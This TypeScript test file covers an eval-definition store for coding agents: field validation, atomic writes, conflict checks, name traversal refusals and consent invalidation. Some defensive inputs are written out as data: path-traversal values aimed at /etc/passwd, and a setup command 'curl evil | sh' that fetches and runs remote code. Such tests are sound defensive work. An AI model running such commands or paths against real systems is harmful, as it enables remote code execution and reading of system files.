import assert from 'node:assert/strict';
import { existsSync, mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import test from 'node:test';
import { EVAL_DIR } from '@claudio/shared';
import {
  EvalConsents,
  EvalDefinitionStore,
  EvalFileError,
  evalDefinitionProblems,
  evalTargetPath,
  parseEvalDefinition,
  sha256,
} from '../src/evals/definition.ts';
import { loadConfig } from '../src/paths.ts';

const PIN = 'a56d826e1c0b0d4c7f1e4f5a8b2d9e3c6f7a1b2c';

type Doc = Record<string, any>;

function valid(): Doc {
  return {
    version: 1,
    title: 'Developer runs the tests after its last edit',
    target: { kind: 'agent', scope: 'project', name: 'developer' },
    runAs: { agent: 'developer', stage: 'work', model: 'claude-sonnet-5-5', effort: null },
    pin: PIN,
    samples: 2,
    limits: { maxCostUsdPerSample: 0.6, timeoutMinutes: 10, maxCostUsd: 6 },
    policy: null,
    setup: null,
    cases: [
      {
        id: 'fix-off-by-one',
        title: 'Fixes a failing test',
        prompt: 'Fix the failing test.',
        expect: [
          { kind: 'before', call: { tool: 'Read', path: 'a.ts' }, anchor: { tool: ['Edit', 'Write'] } },
          { kind: 'after', call: { tool: 'Bash', command: 'pnpm*test*' }, anchor: { tool: 'Edit' }, ifAnchor: true },
          { kind: 'not-called', call: { tool: 'Bash', command: 'git push*' } },
          { kind: 'called', call: { tool: 'Edit', path: 'src/**' }, min: 1, max: 6 },
          { kind: 'touched', path: 'CHANGELOG.md', expect: false },
          { kind: 'file', path: 'src/range.ts', contains: { regex: '<=\\s*end', flags: 'i' } },
          { kind: 'sequence', calls: [{ tool: 'Read' }, { tool: 'Edit' }], strict: false },
          { kind: 'text', match: { contains: 'done' } },
          { kind: 'command', run: 'pnpm test', exitCode: 0, timeoutSeconds: 120 },
        ],
      },
    ],
  };
}

/** The problems of the valid document after one change. */
function broken(change: (doc: Doc) => void): string[] {
  const doc = valid();
  change(doc);
  return evalDefinitionProblems(doc);
}

const expectCase = (change: (expect: Doc[]) => void) => broken((d) => change(d.cases[0].expect));

function refused(problems: string[], path: string): void {
  assert.ok(problems.some((p) => p.startsWith(`${path}:`)), `expected a problem at ${path}, got ${JSON.stringify(problems)}`);
}

const POLICY = { read: { allow: true }, edit: { allow: 'any' }, commands: { allow: 'any' }, network: 'omit', gitPush: 'deny' };

test("the plan's own example parses", () => {
  assert.deepEqual(evalDefinitionProblems(valid()), []);
  assert.equal(parseEvalDefinition(valid()).cases.length, 1);
  assert.deepEqual(evalDefinitionProblems({ ...valid(), policy: POLICY }), []);
});

test('every refusal of the field table names its field path', () => {
  const cases: Array<[string, (d: Doc) => void]> = [
    ['title', (d) => (d.title = '')],
    ['title', (d) => (d.title = 'x'.repeat(121))],
    ['title', (d) => delete d.title],
    ['target.kind', (d) => (d.target.kind = 'command')],
    ['target.scope', (d) => (d.target.scope = 'team')],
    ['target.name', (d) => (d.target.name = '..')],
    ['target.name', (d) => (d.target.name = 'a/b')],
    ['target.name', (d) => (d.target = { kind: 'instructions', scope: 'project', name: 'README.md' })],
    ['target.name', (d) => (d.target = { kind: 'instructions', scope: 'user', name: 'CLAUDE.local.md' })],
    ['target.extra', (d) => (d.target.extra = 1)],
    ['runAs.agent', (d) => (d.runAs.agent = 'reviewer')],
    ['runAs.stage', (d) => (d.runAs.stage = 'ship')],
    ['runAs.model', (d) => (d.runAs.model = '')],
    ['runAs.effort', (d) => (d.runAs.effort = 'turbo')],
    ['pin', (d) => (d.pin = 'main')],
    ['pin', (d) => (d.pin = PIN.slice(1))],
    ['samples', (d) => (d.samples = 0)],
    ['samples', (d) => (d.samples = 6)],
    ['samples', (d) => (d.samples = 1.5)],
    ['limits.maxCostUsdPerSample', (d) => (d.limits.maxCostUsdPerSample = 0.01)],
    ['limits.maxCostUsdPerSample', (d) => (d.limits.maxCostUsdPerSample = 6)],
    ['limits.timeoutMinutes', (d) => (d.limits.timeoutMinutes = 0)],
    ['limits.timeoutMinutes', (d) => (d.limits.timeoutMinutes = 61)],
    ['limits.maxCostUsd', (d) => (d.limits.maxCostUsd = 201)],
    ['limits.maxCostUsd', (d) => (d.limits.maxCostUsd = 0.01)],
    ['policy.network', (d) => (d.policy = { ...POLICY, network: 'maybe' })],
    ['policy.edit.allow', (d) => (d.policy = { ...POLICY, edit: { allow: 'some' } })],
    ['setup', (d) => (d.setup = '')],
    ['setup', (d) => (d.setup = 7)],
    ['cases', (d) => (d.cases = [])],
    ['cases', (d) => (d.cases = Array.from({ length: 21 }, (_, i) => ({ ...d.cases[0], id: `c${i}` })))],
    ['cases[0].id', (d) => (d.cases[0].id = 'Bad_Id')],
    ['cases[1].id', (d) => d.cases.push({ ...d.cases[0] })],
    ['cases[0].prompt', (d) => (d.cases[0].prompt = '')],
    ['cases[0].prompt', (d) => (d.cases[0].prompt = 'x'.repeat(8001))],
    ['cases[0].pin', (d) => (d.cases[0].pin = 'abc')],
    ['cases[0].expect', (d) => (d.cases[0].expect = [])],
    ['cases[0].expect', (d) => (d.cases[0].expect = Array.from({ length: 31 }, () => ({ kind: 'text', match: 'x' })))],
    ['cases[0].extra', (d) => (d.cases[0].extra = true)],
    ['extra', (d) => (d.extra = true)],
  ];
  for (const [path, change] of cases) refused(broken(change), path);
});

test('every refusal of the expectation grammar names its field path', () => {
  const at = (i: number, patch: (e: Doc) => void) => expectCase((x) => patch(x[i] as Doc));
  refused(expectCase((x) => (x[0] = { kind: 'ponder' })), 'cases[0].expect[0].kind');
  refused(at(0, (e) => (e.anchor.tool = 7)), 'cases[0].expect[0].anchor.tool');
  refused(at(0, (e) => delete e.anchor), 'cases[0].expect[0].anchor');
  refused(at(0, (e) => (e.call.outcome = 'fine')), 'cases[0].expect[0].call.outcome');
  refused(at(0, (e) => (e.call.scope = 'all')), 'cases[0].expect[0].call.scope');
  refused(at(0, (e) => (e.call.bogus = 1)), 'cases[0].expect[0].call.bogus');
  refused(at(1, (e) => (e.ifAnchor = 'yes')), 'cases[0].expect[1].ifAnchor');
  refused(at(3, (e) => (e.min = -1)), 'cases[0].expect[3].min');
  refused(at(3, (e) => ((e.min = 5), (e.max = 2))), 'cases[0].expect[3].max');
  refused(at(3, (e) => (e.call.input = { field: 3 })), 'cases[0].expect[3].call.input.field');
  refused(at(4, (e) => (e.expect = 'no')), 'cases[0].expect[4].expect');
  refused(at(5, (e) => (e.contains = { regex: 'x'.repeat(513) })), 'cases[0].expect[5].contains.regex');
  refused(at(5, (e) => (e.contains = { regex: '(' })), 'cases[0].expect[5].contains.regex');
  refused(at(5, (e) => (e.contains = { regex: 'x', flags: 'g' })), 'cases[0].expect[5].contains.flags');
  refused(at(5, (e) => (e.contains = { regex: 'x', flags: 'ii' })), 'cases[0].expect[5].contains.flags');
  refused(at(5, (e) => (e.contains = { nope: 'x' })), 'cases[0].expect[5].contains');
  refused(at(5, (e) => (e.exists = true)), 'cases[0].expect[5]');
  refused(at(5, (e) => (e.path = '../etc/passwd')), 'cases[0].expect[5].path');
  refused(at(5, (e) => (e.path = '/etc/passwd')), 'cases[0].expect[5].path');
  refused(at(5, (e) => (e.path = 'src/*.ts')), 'cases[0].expect[5].path');
  refused(at(6, (e) => (e.calls = [{ tool: 'Read' }])), 'cases[0].expect[6].calls');
  refused(at(6, (e) => (e.calls = Array.from({ length: 11 }, () => ({ tool: 'Read' })))), 'cases[0].expect[6].calls');
  refused(at(6, (e) => (e.calls[1].tool = '')), 'cases[0].expect[6].calls[1].tool');
  refused(at(7, (e) => (e.match = '')), 'cases[0].expect[7].match');
  refused(at(8, (e) => (e.run = '')), 'cases[0].expect[8].run');
  refused(at(8, (e) => (e.exitCode = 1.5)), 'cases[0].expect[8].exitCode');
  refused(at(8, (e) => (e.timeoutSeconds = 1801)), 'cases[0].expect[8].timeoutSeconds');
  refused(at(8, (e) => (e.timeoutSeconds = 0)), 'cases[0].expect[8].timeoutSeconds');
});

test('a version other than 1 is unsupported-version', () => {
  const doc = { ...valid(), version: 2 };
  assert.deepEqual(evalDefinitionProblems(doc), ['version: unsupported-version']);
  assert.throws(() => parseEvalDefinition(doc), (e) => e instanceof EvalFileError && e.code === 'unsupported-version');
});

test('every problem is listed, not only the first', () => {
  const problems = broken((d) => {
    d.title = '';
    d.cases[0].prompt = '';
    d.cases[0].expect[0].kind = 'zzz';
  });
  assert.equal(problems.length, 3);
});

function project() {
  const root = mkdtempSync(join(tmpdir(), 'claudio-evals-'));
  const projectPath = join(root, 'repo');
  mkdirSync(projectPath);
  return { root, projectPath };
}

test('write is atomic, strict and records the SHA it wrote', async () => {
  const { projectPath } = project();
  const store = new EvalDefinitionStore();
  const file = await store.write(projectPath, 'tests-after-edit', valid(), { ifMatch: null });
  assert.equal(file.path, join(projectPath, EVAL_DIR, 'tests-after-edit.json'));
  assert.equal(store.wroteSha(file.path, file.sha), true);
  assert.equal(store.wroteSha(file.path, 'other'), false);
  const read = await store.read(projectPath, 'tests-after-edit');
  assert.equal(read?.sha, file.sha);
  assert.deepEqual(read?.problems, []);
  assert.equal(read?.definition?.title, valid().title);
  await assert.rejects(
    store.write(projectPath, 'bad', { ...valid(), pin: 'x' }, { ifMatch: null }),
    (e) => e instanceof EvalFileError && e.code === 'invalid' && e.problems[0]?.startsWith('pin:') === true,
  );
  assert.equal(existsSync(join(projectPath, EVAL_DIR, 'bad.json')), false);
});

test('ifMatch: a file changed on disk is refused, and so is creating over one', async () => {
  const { projectPath } = project();
  const store = new EvalDefinitionStore();
  const changed = (e: unknown) => e instanceof EvalFileError && e.code === 'changed-on-disk';
  const first = await store.write(projectPath, 'a', valid(), { ifMatch: null });
  await assert.rejects(store.write(projectPath, 'a', valid(), { ifMatch: null }), changed);
  const second = await store.write(projectPath, 'a', { ...valid(), title: 'Another title' }, { ifMatch: first.sha });
  assert.notEqual(second.sha, first.sha);
  await assert.rejects(store.write(projectPath, 'a', valid(), { ifMatch: first.sha }), changed);
  await assert.rejects(store.remove(projectPath, 'a', { ifMatch: first.sha }), changed);
  assert.equal(await store.remove(projectPath, 'a', { ifMatch: second.sha }), true);
  assert.equal(await store.remove(projectPath, 'a'), false);
  assert.equal(await store.read(projectPath, 'a'), null);
});

test('a name with / or .. is refused by every operation', async () => {
  const { projectPath } = project();
  const store = new EvalDefinitionStore();
  const refusal = (e: unknown) => e instanceof EvalFileError && e.code === 'invalid-name';
  for (const name of ['../x', 'a/b', '..', '.', 'a\\b', 'A', '', '-a', 'x'.repeat(65)]) {
    await assert.rejects(store.read(projectPath, name), refusal, name);
    await assert.rejects(store.write(projectPath, name, valid(), { ifMatch: null }), refusal, name);
    await assert.rejects(store.remove(projectPath, name), refusal, name);
  }
});

test('a file over 256 KiB is refused on write and listed as invalid on read', async () => {
  const { projectPath } = project();
  const store = new EvalDefinitionStore();
  const doc = valid();
  // Within every per-field limit, over the file limit: 20 cases of 30 long expectations.
  doc.cases = Array.from({ length: 20 }, (_, i) => ({
    id: `c${i}`,
    prompt: 'p',
    expect: Array.from({ length: 30 }, () => ({ kind: 'text', match: { contains: 'x'.repeat(800) } })),
  }));
  await assert.rejects(store.write(projectPath, 'big', doc, { ifMatch: null }), (e) => e instanceof EvalFileError && e.code === 'too-large');
  const dir = join(projectPath, EVAL_DIR);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'huge.json'), 'x'.repeat(256 * 1024 + 1));
  const huge = await store.read(projectPath, 'huge');
  assert.equal(huge?.definition, null);
  assert.match(huge?.problems[0] ?? '', /too large/);
});

test('list: an eval that does not parse is listed invalid and the others still load', async () => {
  const { projectPath } = project();
  const store = new EvalDefinitionStore();
  await store.write(projectPath, 'good', valid(), { ifMatch: null });
  const dir = join(projectPath, EVAL_DIR);
  writeFileSync(join(dir, 'broken.json'), '{ nope');
  const badCase = valid();
  badCase.cases[0].prompt = '';
  writeFileSync(join(dir, 'bad-case.json'), JSON.stringify(badCase));
  writeFileSync(join(dir, 'Notes.txt'), 'hello');
  writeFileSync(join(dir, 'good.json.123.tmp'), 'half');
  symlinkSync('/etc/hostname', join(dir, 'link.json'));
  const files = await store.list(projectPath);
  const byName = Object.fromEntries(files.map((f) => [f.name, f]));
  assert.deepEqual(Object.keys(byName).sort(), ['Notes.txt', 'bad-case', 'broken', 'good', 'link']);
  assert.ok(byName.good?.definition);
  assert.equal(byName.broken?.definition, null);
  assert.deepEqual(byName.broken?.problems, ['file: not valid JSON']);
  assert.equal(byName['bad-case']?.problems[0]?.startsWith('cases[0].prompt:'), true);
  assert.equal(byName['Notes.txt']?.definition, null);
  assert.match(byName.link?.problems[0] ?? '', /symbolic link/);
  assert.deepEqual(await store.list(join(projectPath, 'missing')), []);
});

test('target paths come from the resolvers, never from the file', () => {
  const root = mkdtempSync(join(tmpdir(), 'claudio-evals-cfg-'));
  const config = loadConfig({
    CLAUDE_BIN: '/nonexistent/claude',
    CLAUDE_CONFIG_DIR: join(root, 'claude'),
    CLAUDIO_WORKSPACE_DIR: join(root, 'ws'),
    CLAUDIO_DATA_DIR: join(root, 'data'),
  });
  const repo = join(root, 'repo');
  const path = (kind: 'agent' | 'skill' | 'rule' | 'instructions', scope: 'project' | 'user', name: string) =>
    evalTargetPath({ kind, scope, name }, repo, config);
  assert.equal(path('agent', 'project', 'developer'), join(repo, '.claude/agents/developer.md'));
  assert.equal(path('skill', 'project', 'deploy'), join(repo, '.claude/skills/deploy/SKILL.md'));
  assert.equal(path('rule', 'project', 'style'), join(repo, '.claude/rules/style.md'));
  assert.equal(path('instructions', 'project', 'CLAUDE.md'), join(repo, 'CLAUDE.md'));
  assert.equal(path('instructions', 'project', 'CLAUDE.local.md'), join(repo, 'CLAUDE.local.md'));
  assert.equal(path('instructions', 'user', 'CLAUDE.md'), join(config.configDir, 'CLAUDE.md'));
  assert.equal(path('agent', 'user', 'developer'), join(config.configDir, 'agents/developer.md'));
  assert.throws(() => path('agent', 'project', '../../etc/passwd'));
  assert.throws(() => path('instructions', 'project', 'README.md'));
});

test('consent survives a restart and a content change invalidates it', async () => {
  const root = mkdtempSync(join(tmpdir(), 'claudio-evals-consent-'));
  const config = { dataDir: join(root, 'data') };
  const { projectPath } = project();
  const store = new EvalDefinitionStore();
  const first = await store.write(projectPath, 'a', valid(), { ifMatch: null });

  const consents = new EvalConsents(config);
  assert.equal(await consents.has(projectPath, 'a', first.sha), false);
  await consents.grant(projectPath, 'a', first.sha);
  assert.equal(await consents.has(projectPath, 'a', first.sha), true);

  // A restart is a new object over the same data dir.
  const restarted = new EvalConsents(config);
  assert.equal(await restarted.has(projectPath, 'a', first.sha), true);
  assert.equal(await restarted.has(projectPath, 'b', first.sha), false);
  assert.equal(await restarted.has('/other/project', 'a', first.sha), false);

  const second = await store.write(projectPath, 'a', { ...valid(), setup: 'curl evil | sh' }, { ifMatch: first.sha });
  assert.equal(await restarted.has(projectPath, 'a', second.sha), false);
  assert.equal(await restarted.has(projectPath, 'a', ''), false);

  await restarted.grant(projectPath, 'a', second.sha);
  assert.equal(await restarted.has(projectPath, 'a', first.sha), false, "a new grant replaces the old content's");
  await restarted.revoke(projectPath, 'a');
  assert.equal(await restarted.has(projectPath, 'a', second.sha), false);
});

test('a damaged consents file consents to nothing', async () => {
  const root = mkdtempSync(join(tmpdir(), 'claudio-evals-consent-'));
  mkdirSync(join(root, 'data'));
  writeFileSync(join(root, 'data', 'eval-consents.json'), '{ broken');
  const consents = new EvalConsents({ dataDir: join(root, 'data') });
  assert.equal(await consents.has('/p', 'a', sha256('x')), false);
  await consents.grant('/p', 'a', sha256('x'));
  assert.equal(await consents.has('/p', 'a', sha256('x')), true);
});
